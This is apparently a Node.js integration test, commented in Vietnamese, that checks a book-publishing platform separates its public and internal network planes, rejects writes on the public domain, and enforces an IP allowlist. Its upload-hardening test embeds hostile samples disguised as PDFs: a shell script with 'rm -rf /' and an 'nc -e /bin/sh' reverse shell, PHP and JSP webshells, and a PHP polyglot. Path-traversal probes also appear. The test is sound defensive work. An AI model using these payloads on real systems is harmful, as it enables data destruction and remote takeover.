"use strict";
/**
 * Yeu cau an ninh MISA: (1) BE chi cho IP MISA, (2) publish ra domain public chi doc sach da publish.
 *
 * Kiem chung hai mat phang:
 *   NOI BO  (http://127.0.0.1:8080)  - Dashboard/BE/upload, chi MISA_ALLOWED_CIDRS
 *   CONG KHAI (http://127.0.0.1:8081) - public-edge, chi doc sach da publish
 *
 * Chay:  API_BASE_URL=http://127.0.0.1:8080/api PUBLIC_EDGE_URL=http://127.0.0.1:8081 \
 *        SEED_ADMIN_PASSWORD=... node network_planes.test.js
 *  - NETPLANE_RECONFIGURE=1 : them nhom "IP ngoai danh sach" (tao lai proxy+api voi CIDR gia roi khoi phuc).
 *  - Bo qua guard-API/reconfigure neu khong co docker.
 */
process.env.API_BASE_URL = process.env.API_BASE_URL ?? "http://127.0.0.1:8080/api";
const fs = require("fs");
const path = require("path");
const { execFileSync } = require("child_process");
const { api, adminLogin, createCreator, waitJob } = require("./lib/corpus");

const INTERNAL = (process.env.INTERNAL_URL ?? "http://127.0.0.1:8080").replace(/\/$/, "");
const PUB = (process.env.PUBLIC_EDGE_URL ?? "http://127.0.0.1:8081").replace(/\/$/, "");
const COMPOSE_DIR = path.resolve(__dirname, "../../infra/docker");
const FIXTURE = path.resolve(__dirname, "../fixtures/pdf/sample_vi_text.pdf");
const RECONFIGURE = process.env.NETPLANE_RECONFIGURE === "1";

let passed = 0;
let failed = 0;
function check(name, ok, detail) {
  if (ok) {
    passed += 1;
    console.log("  PASS: " + name);
  } else {
    failed += 1;
    console.log("  FAIL: " + name + (detail !== undefined ? " -- " + JSON.stringify(detail) : ""));
  }
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function pub(method, p, { headers, body } = {}) {
  const res = await fetch(PUB + p, { method, headers, body, redirect: "manual" });
  const text = await res.text().catch(() => "");
  return { status: res.status, headers: res.headers, text };
}
async function internal(method, p, opts = {}) {
  const res = await fetch(INTERNAL + p, { method, headers: opts.headers, body: opts.body, redirect: "manual" });
  const text = await res.text().catch(() => "");
  return { status: res.status, headers: res.headers, text };
}
function uploadForm(buf, name, type) {
  const f = new FormData();
  f.append("file", new Blob([buf], { type }), name);
  return f;
}
function dockerAvailable() {
  try {
    execFileSync("docker", ["compose", "version"], { cwd: COMPOSE_DIR, stdio: "ignore" });
    return true;
  } catch {
    return false;
  }
}
function compose(args, env = {}) {
  return execFileSync("docker", ["compose", ...args], { cwd: COMPOSE_DIR, env: { ...process.env, ...env }, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] });
}
function apiFetchInside(url, xff, method = "GET") {
  const script = `fetch(${JSON.stringify(url)},{method:${JSON.stringify(method)},headers:{"x-forwarded-for":${JSON.stringify(xff)}}}).then(r=>console.log(r.status)).catch(e=>console.log("ERR "+e.message))`;
  return compose(["exec", "-T", "api", "node", "-e", script]).trim();
}
async function waitHealthy(url, ms = 60000) {
  const t0 = Date.now();
  while (Date.now() - t0 < ms) {
    try {
      const r = await fetch(url);
      if (r.status === 200) return true;
    } catch {
      /* chua san sang */
    }
    await sleep(1000);
  }
  return false;
}

(async () => {
  console.log("=== NETWORK PLANES: noi bo (IP MISA) + cong khai (public-edge) ===");
  console.log("  noi bo:", INTERNAL, "| cong khai:", PUB);

  /* ---------- Chuan bi: 1 sach da publish + 1 sach nhap ---------- */
  const adminToken = await adminLogin();
  const creator = await createCreator(adminToken, "NetPlane");
  const { token, tenantId } = creator;
  const pdf = fs.readFileSync(FIXTURE);
  const book = await api("POST", "/books", { token, tenantId, json: { title: "Net plane test" } });
  const bookId = book.data.id;
  const permalink = `${book.data.permalink_slug}-${book.data.permalink_suffix}`;
  const up = await api("POST", `/books/${bookId}/upload`, { token, tenantId, form: uploadForm(pdf, "sample.pdf", "application/pdf") });
  check("chuan bi: upload PDF hop le -> 201", up.status === 201, up.data);
  const { job } = await waitJob(up.data.jobId, token, tenantId);
  check("chuan bi: convert xong", job.state === "done", job);
  const pubRes = await api("POST", `/books/${bookId}/publish`, { token, tenantId, json: { revisionId: up.data.revisionId } });
  check("chuan bi: publish", [200, 201].includes(pubRes.status), pubRes.status);
  const draft = await api("POST", "/books", { token, tenantId, json: { title: "Sach nhap chua publish" } });
  const draftPermalink = `${draft.data.permalink_slug}-${draft.data.permalink_suffix}`;
  const revisionsBefore = (await api("GET", `/books/${bookId}/revisions`, { token, tenantId })).data.length;

  /* ---------- CONG KHAI: nhung gi PHAI doc duoc ---------- */
  console.log("");
  console.log("P1: domain public doc duoc sach da publish.");
  let r = await pub("GET", "/health");
  check("P1: /health 200", r.status === 200, r.status);
  r = await pub("GET", `/api/public/books/${permalink}`);
  let bookJson = null;
  try {
    bookJson = JSON.parse(r.text);
  } catch {
    /* khong phai JSON */
  }
  check("P1: GET /api/public/books/<permalink> -> 200 co pages", r.status === 200 && Array.isArray(bookJson?.pages) && bookJson.pages.length > 0, r.status);
  r = await pub("GET", `/api/public/books/${permalink}/metadata`);
  check("P1: /metadata -> 200", r.status === 200, r.status);
  const firstAsset = bookJson?.pages?.find((x) => x.imageAssetId)?.imageAssetId;
  if (firstAsset) {
    const a = await fetch(`${PUB}/api/public/books/${permalink}/assets/${firstAsset}`);
    check("P1: anh trang -> 200 image/*", a.status === 200 && /^image\//.test(a.headers.get("content-type") ?? ""), [a.status, a.headers.get("content-type")]);
    const rg = await fetch(`${PUB}/api/public/books/${permalink}/assets/${firstAsset}`, { headers: { Range: "bytes=0-99" } });
    check("P1: Range di qua public-edge -> 206", rg.status === 206, rg.status);
  } else {
    check("P1: co imageAssetId trang dau", false, bookJson?.pages?.[0]);
  }
  for (const p of [`/${permalink}`, `/read/${permalink}`, `/${permalink}/embed`, `/read/${permalink}/embed`]) {
    r = await pub("GET", p);
    check(`P1: trinh doc ${p} -> 200 HTML`, r.status === 200 && /<html/i.test(r.text), r.status);
  }
  r = await pub("GET", `/${permalink}`);
  const scriptSrc = /\/_next\/static\/[^"' ]+\.js/.exec(r.text)?.[0];
  if (scriptSrc) {
    const s = await pub("GET", scriptSrc);
    check("P1: static /_next/... -> 200", s.status === 200, s.status);
  } else {
    check("P1: tim thay script /_next trong HTML", false);
  }
  check("P1: co X-Content-Type-Options: nosniff", r.headers.get("x-content-type-options") === "nosniff", r.headers.get("x-content-type-options"));

  /* ---------- CONG KHAI: nhung gi KHONG DUOC ton tai ---------- */
  console.log("");
  console.log("P2: domain public KHONG co trang/API noi bo (GET).");
  const blockedGets = [
    "/", "/login", "/dashboard", "/dashboard/books/abc", "/admin", "/admin/x",
    "/api", "/api/", "/api/auth/login", "/api/me", "/api/books", `/api/books/${bookId}`, `/api/books/${bookId}/revisions`,
    "/api/admin/tenants", "/api/admin/users", "/api/admin/stats", "/api/admin/audit-logs", `/api/jobs/${up.data.jobId}`,
    "/api/public/books", "/api/public/books/", `/api/public/books/${permalink}/../../books`, `/api/public/books/${permalink}/nope`,
    "/api/public/books/%2e%2e/books", "/api/health/../books", "/.env", "/etc/passwd", "/_next/../login",
  ];
  const leaks = [];
  for (const p of blockedGets) {
    const x = await pub("GET", p);
    if (![404, 400].includes(x.status)) leaks.push([p, x.status]);
  }
  check("P2: " + blockedGets.length + " duong noi bo/khong hop le deu 404/400 (khong lo)", leaks.length === 0, leaks);

  console.log("");
  console.log("P3: domain public KHONG cho ghi / upload / dang nhap (POST/PUT/PATCH/DELETE), ke ca khi co token hop le.");
  const auth = { Authorization: `Bearer ${token}`, "x-tenant-id": tenantId };
  r = await pub("POST", "/api/auth/login", { headers: { "Content-Type": "application/json" }, body: JSON.stringify({ email: creator.email, password: creator.password }) });
  check("P3: POST /api/auth/login (dung mat khau that) -> 404, khong cap token", r.status === 404 && !/accessToken/.test(r.text), [r.status, r.text.slice(0, 80)]);
  r = await pub("POST", "/api/books", { headers: { ...auth, "Content-Type": "application/json" }, body: JSON.stringify({ title: "hack" }) });
  check("P3: POST /api/books voi token hop le -> 404", r.status === 404, r.status);
  const fd = uploadForm(pdf, "x.pdf", "application/pdf");
  r = await pub("POST", `/api/books/${bookId}/upload`, { headers: auth, body: fd });
  check("P3: POST upload PDF qua domain public -> 404/413 (khong toi BE)", [404, 413].includes(r.status), r.status);
  r = await pub("POST", `/api/books/${bookId}/publish`, { headers: { ...auth, "Content-Type": "application/json" }, body: "{}" });
  check("P3: POST publish qua domain public -> 404", r.status === 404, r.status);
  r = await pub("DELETE", `/api/admin/books/${bookId}`, { headers: auth });
  check("P3: DELETE admin qua domain public -> 404", r.status === 404, r.status);
  const revisionsAfter = (await api("GET", `/books/${bookId}/revisions`, { token, tenantId })).data.length;
  check("P3: khong co revision moi nao duoc tao qua cong public", revisionsAfter === revisionsBefore, [revisionsBefore, revisionsAfter]);
  for (const m of ["PUT", "PATCH", "DELETE", "POST"]) {
    r = await pub(m, `/api/public/books/${permalink}`, { headers: { "Content-Type": "application/json" }, body: m === "DELETE" ? undefined : "{}" });
    check(`P3: ${m} /api/public/books/<permalink> bi chan (403/404/405)`, [403, 404, 405].includes(r.status), r.status);
  }
  r = await pub("POST", `/${permalink}`, { headers: { "Content-Type": "application/json" }, body: "{}" });
  check("P3: POST len trang doc bi chan", [403, 404, 405].includes(r.status), r.status);
  r = await pub("POST", `/api/public/books/${permalink}/events`, { headers: { "Content-Type": "application/json" }, body: "x".repeat(100 * 1024) });
  check("P3: body 100KB toi /events -> 413 (gioi han 16KB)", r.status === 413, r.status);
  r = await pub("POST", `/api/public/books/${permalink}/verify-password`, { headers: { "Content-Type": "application/json" }, body: JSON.stringify({ password: "sai" }) });
  check("P3: verify-password van toi duoc API (tra JSON, khong phai loi nginx)", /json/.test(r.headers.get("content-type") ?? ""), [r.status, r.headers.get("content-type")]);

  console.log("");
  console.log("P4: chi sach DA PUBLISH moi lo ra tren domain public.");
  r = await pub("GET", `/api/public/books/${draftPermalink}`);
  check("P4: sach nhap (chua publish) -> 404 tren domain public", r.status === 404, r.status);
  r = await pub("GET", `/api/public/books/${draftPermalink}/metadata`);
  check("P4: metadata sach nhap -> 404", r.status === 404, r.status);

  /* ---------- NOI BO: upload chi nhan PDF that ---------- */
  console.log("");
  console.log("I1: mat phang noi bo tu choi file gia mao (shell/script/exe/docx) thay vi PDF.");
  const b2 = await api("POST", "/books", { token, tenantId, json: { title: "Upload hardening" } });
  const b2id = b2.data.id;
  const tryUp = async (label, buf, name, type, expect = [400]) => {
    const x = await api("POST", `/books/${b2id}/upload`, { token, tenantId, form: uploadForm(buf, name, type) });
    check(`I1: ${label} -> ${expect.join("/")}`, expect.includes(x.status), [x.status, x.data?.message]);
  };
  await tryUp("shell script dat ten .pdf, Content-Type application/pdf", Buffer.from("#!/bin/sh\nrm -rf /\nnc -e /bin/sh 1.2.3.4 4444\n"), "invoice.pdf", "application/pdf");
  await tryUp("webshell PHP dat ten .pdf", Buffer.from("<?php system($_GET['c']); ?>"), "report.pdf", "application/pdf");
  await tryUp("JSP/ASPX webshell .pdf", Buffer.from('<%@ page import="java.io.*" %><% Runtime.getRuntime().exec(request.getParameter("c")); %>'), "a.pdf", "application/pdf");
  await tryUp("ELF binary .pdf", Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46]), Buffer.alloc(200, 1)]), "a.pdf", "application/pdf");
  await tryUp("Windows PE (.exe) .pdf", Buffer.concat([Buffer.from("MZ"), Buffer.alloc(300, 2)]), "a.pdf", "application/pdf");
  await tryUp("file .docx (zip PK) dat Content-Type PDF", Buffer.concat([Buffer.from("PK\u0003\u0004"), Buffer.alloc(500, 3)]), "a.docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document");
  await tryUp("file rong 0 byte", Buffer.alloc(0), "empty.pdf", "application/pdf");
  await tryUp("phan mo dau la script, %PDF- nam sau", Buffer.concat([Buffer.from("<?php echo 1; ?>\n"), pdf]), "a.pdf", "application/pdf");
  await tryUp("%PDF- header nhung thieu %%EOF (cat cut)", Buffer.from("%PDF-1.4\n1 0 obj<<>>endobj\n" + "A".repeat(3000)), "a.pdf", "application/pdf");
  await tryUp("PDF hop le bi noi >1KB payload PHP phia sau %%EOF", Buffer.concat([pdf, Buffer.from("\n<?php system($_GET['c']); ?>" + " ".repeat(2000))]), "polyglot.pdf", "application/pdf");
  await tryUp("PDF hop le nhung khai bao Content-Type text/html va ten .php van duoc coi la PDF theo noi dung (khong tin ten/Content-Type)", pdf, "shell.php", "text/html", [201]);
  // ten file doc hai KHONG duoc dung lam duong dan luu
  await tryUp("ten file path traversal '../../etc/x.pdf' khong anh huong (luu theo khoa server sinh)", pdf, "../../etc/x.pdf", "application/pdf", [201]);
  const list = await api("GET", `/books/${b2id}/revisions`, { token, tenantId });
  const keys = JSON.stringify(list.data);
  check("I1: khoa luu tru khong chua ten file client gui", !/shell\.php|etc\/x|\.\.\//.test(keys), keys.slice(0, 200));

  /* ---------- Guard trong API (khong phu thuoc nginx) ---------- */
  const haveDocker = dockerAvailable();
  console.log("");
  console.log("G1: guard IP trong API (lop thu hai, doc lap voi nginx).");
  if (!haveDocker) {
    console.log("  (bo qua: khong co docker compose)");
  } else {
    check("G1: IP ngoai danh sach (203.0.113.9) vao /books -> 403", apiFetchInside("http://localhost:3000/books", "203.0.113.9") === "403");
    check("G1: IP ngoai danh sach vao /auth/login (POST) -> 403", apiFetchInside("http://localhost:3000/auth/login", "203.0.113.9", "POST") === "403");
    check("G1: IP ngoai danh sach vao /admin/tenants -> 403", apiFetchInside("http://localhost:3000/admin/tenants", "203.0.113.9") === "403");
    check("G1: IP MISA (10.1.2.3) vao /books -> qua guard (401 thieu token)", apiFetchInside("http://localhost:3000/books", "10.1.2.3") === "401");
    check("G1: IP ngoai danh sach van doc duoc /public/books/<permalink> (200)", apiFetchInside(`http://localhost:3000/public/books/${permalink}`, "203.0.113.9") === "200");
    check("G1: IP ngoai danh sach van goi duoc /health (200)", apiFetchInside("http://localhost:3000/health", "203.0.113.9") === "200");
    check("G1: IPv6 ngoai danh sach (2001:db8::1) vao /books -> 403", apiFetchInside("http://localhost:3000/books", "2001:db8::1") === "403");
  }

  /* ---------- Cau hinh lai voi CIDR gia (destructive, opt-in) ---------- */
  console.log("");
  console.log("R1: nginx noi bo + API dung allowlist that (tao lai voi CIDR gia 203.0.113.0/24).");
  if (!haveDocker || !RECONFIGURE) {
    console.log("  (bo qua: dat NETPLANE_RECONFIGURE=1 va can docker)");
  } else {
    const original = fs.readFileSync(path.join(COMPOSE_DIR, ".env"), "utf8").match(/^MISA_ALLOWED_CIDRS=(.*)$/m)?.[1]?.trim();
    try {
      compose(["up", "-d", "--no-deps", "--force-recreate", "proxy", "api"], { MISA_ALLOWED_CIDRS: "203.0.113.0/24" });
      await waitHealthy(PUB + "/health", 90000);
      await sleep(4000);
      let x = await internal("POST", "/api/auth/login", { headers: { "Content-Type": "application/json" }, body: JSON.stringify({ email: creator.email, password: creator.password }) });
      check("R1: dang nhap tu IP ngoai danh sach qua cong noi bo -> 403 (khong co token)", x.status === 403 && !/accessToken/.test(x.text), [x.status, x.text.slice(0, 60)]);
      x = await internal("GET", "/login");
      check("R1: trang /login tu IP ngoai danh sach -> 403", x.status === 403, x.status);
      x = await internal("GET", "/dashboard");
      check("R1: /dashboard -> 403", x.status === 403, x.status);
      x = await internal("GET", `/${permalink}`);
      check("R1: ngay ca trang doc tren cong NOI BO cung 403 voi IP la (nguoi ngoai phai dung domain public)", x.status === 403, x.status);
      x = await pub("GET", `/read/${permalink}`);
      check("R1: domain public van doc duoc sach khi allowlist khong chua IP khach", x.status === 200, x.status);
      x = await pub("GET", `/api/public/books/${permalink}`);
      check("R1: API public qua public-edge van 200", x.status === 200, x.status);
      x = await pub("POST", "/api/auth/login", { headers: { "Content-Type": "application/json" }, body: JSON.stringify({ email: creator.email, password: creator.password }) });
      check("R1: dang nhap qua domain public van khong duoc", x.status === 404, x.status);
    } finally {
      compose(["up", "-d", "--no-deps", "--force-recreate", "proxy", "api"], original ? { MISA_ALLOWED_CIDRS: original } : {});
      await waitHealthy(INTERNAL + "/health", 90000);
      await sleep(3000);
    }
    const back = await internal("POST", "/api/auth/login", { headers: { "Content-Type": "application/json" }, body: JSON.stringify({ email: creator.email, password: creator.password }) });
    check("R1: khoi phuc allowlist dev -> dang nhap noi bo lai binh thuong", back.status === 200 || back.status === 201, back.status);
  }

  console.log("");
  console.log(`=== KET QUA NETWORK PLANES: ${passed} PASS / ${failed} FAIL ===`);
  process.exit(failed ? 1 : 0);
})().catch((e) => {
  console.error("Loi test:", e);
  process.exit(1);
});
